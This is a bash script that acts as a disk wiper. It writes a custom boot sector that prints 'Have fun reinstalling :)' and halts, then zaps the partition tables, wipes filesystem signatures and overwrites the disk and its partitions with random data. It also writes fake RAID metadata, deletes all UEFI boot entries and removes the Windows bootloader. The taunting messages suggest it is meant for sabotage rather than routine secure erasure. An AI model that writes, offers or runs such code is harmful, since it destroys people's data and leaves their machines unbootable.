#!/bin/bash
set -e

# Change if necessary (nvme0n1, sda, sda2, etc...)
DISK="/dev/sda"

if ! [ -b "$DISK" ]; then
  echo "Disk $DISK not found..."
  exit 1
fi

apt-get update && apt-get install -y nasm efibootmgr mdadm wipefs

echo "Overwriting MBR"

cat > funmbr.asm <<'EOF'
BITS 16
ORG 0x7C00

start:
    mov si, message
print:
    lodsb
    or al, al
    jz halt
    mov ah, 0x0E
    int 0x10
    jmp print

halt:
    cli
    hlt
message:
    db "Have fun reinstalling :)", 0

times 510-($-$$) db 0
dw 0xAA55
EOF

nasm -f bin -o funmbr.bin funmbr.asm
dd if=funmbr.bin of=$DISK bs=512 count=1 conv=notrunc

echo "Nuking partition tables"
sgdisk --zap-all $DISK
dd if=/dev/zero of=$DISK bs=512 count=1
dd if=/dev/zero of=$DISK bs=512 seek=$(( $(blockdev --getsz $DISK) - 34 )) count=34

echo "Wiping filesystem"
wipefs -a $DISK

echo "Writing garbage"
dd if=/dev/urandom of=$DISK bs=4M count=10 status=progress

echo "Nuking first MB of NTFS partition"
for part in $(lsblk -ln -o NAME $DISK | grep -E '^sd[a-z][0-9]+$'); do
  dd if=/dev/urandom of=/dev/$part bs=1M count=16 || true
done

echo "Spoofing RAID"
mdadm --create --metadata=1.2 --level=1 --raid-devices=2 $DISK /dev/zero || true

echo "Removing UEFI entries"
efibootmgr | grep -o 'Boot[0-9A-F]\{4\}' | cut -c5-8 | xargs -I{} efibootmgr -b {} -B || true

echo "Nuking Window bootloaderR"
efi_part=$(lsblk -o NAME,FSTYPE,MOUNTPOINT | grep -iE 'vfat.*efi' | awk '{print $1}' | head -n1)
if [ -n "$efi_part" ]; then
  mount /dev/$efi_part /mnt
  rm -rf /mnt/EFI/Microsoft || true
  umount /mnt
fi

echo "Done. Have fun."
